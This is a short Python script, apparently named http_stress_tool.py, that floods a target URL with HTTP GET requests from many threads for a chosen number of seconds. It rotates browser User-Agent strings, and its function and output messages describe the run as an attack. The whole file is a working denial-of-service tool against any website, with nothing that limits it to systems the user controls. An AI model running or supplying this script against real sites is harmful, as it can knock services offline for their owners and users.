import threading
import requests
import random
import time
import sys

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
]

def attack(url):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "*/*"
            }
            response = requests.get(url, headers=headers, timeout=3)
            print(f"[{response.status_code}] Sent to {url}")
        except:
            print("[X] Request failed")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python http_stress_tool.py <url> <threads> <duration_sec>")
        sys.exit()

    target_url = sys.argv[1]
    num_threads = int(sys.argv[2])
    duration = int(sys.argv[3])

    print(f"\n[+] Attacking {target_url} with {num_threads} threads for {duration} seconds...\n")

    for i in range(num_threads):
        t = threading.Thread(target=attack, args=(target_url,))
        t.daemon = True
        t.start()

    time.sleep(duration)
    print("\n[+] Done.")
